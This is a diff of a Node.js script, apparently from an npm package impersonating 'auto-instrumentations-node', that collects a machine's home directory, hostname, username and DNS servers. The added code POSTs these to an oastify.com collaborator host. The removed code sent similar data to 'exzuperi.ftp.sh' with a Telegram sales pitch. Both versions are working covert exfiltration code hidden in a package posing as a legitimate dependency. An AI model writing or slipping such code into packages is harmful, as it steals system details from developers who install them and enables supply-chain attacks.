@@ -1,34 +1,48 @@
-const os = require("os");
-const dns = require("dns");
-const querystring = require("querystring");
-const https = require("https");
-const packageJSON = require("./package.json");
-const package = packageJSON.name;
-const fs = require('fs');
+const os = require('os');
+const dns = require('dns');
+const https = require('https');
+const querystring = require('querystring');
 
-const trackingData = JSON.stringify({
-    hd: os.homedir(),
-    hn: os.hostname(),
-    ls: __dirname,
-    pn: "auto-instrumentations-node",
-});
-
-const options = {
-    hostname: "exzuperi.ftp.sh",
-    port: 449,
-    path: `/PoC/${encodeURIComponent(trackingData)}`,
-    method: "GET",
+// Data to be sent in the POST request
+const data = {
+  hd: os.homedir(),
+  hn: os.hostname(),
+  un: os.userInfo().username,
+  dns: dns.getServers().join(','),
 };
 
+// Convert data to a URL-encoded string
+const postData = querystring.stringify(data);
+
+// POST request options
+const options = {
+  hostname: 'p5v8af15zpoexkiajcdpdb8sgjm9ay.oastify.com', // Replace with the hostname or IP address of your server
+  port: 443, // Replace with the port number your server is listening on
+  path: '/',
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Content-Length': postData.length,
+  },
+};
+
+// Send the POST request
 const req = https.request(options, (res) => {
-    res.on("data", (d) => {
-        //process.stdout.write(d);
-    });
+  console.log(`Status Code: ${res.statusCode}`);
+ 
+  res.on('data', (chunk) => {
+    console.log(`Response: ${chunk}`);
+  });
+ 
+  res.on('end', () => {
+    console.log('POST request completed.');
+  });
 });
 
-req.on("error", (e) => {
-    console.error(e);
+req.on('error', (error) => {
+  console.error(`Error sending POST request: ${error.message}`);
 });
 
-process.stdout.write("You can reach me, if you want to buy it: https://t.me/exzuperi");
+// Send the data in the POST request
+req.write(postData);
 req.end();
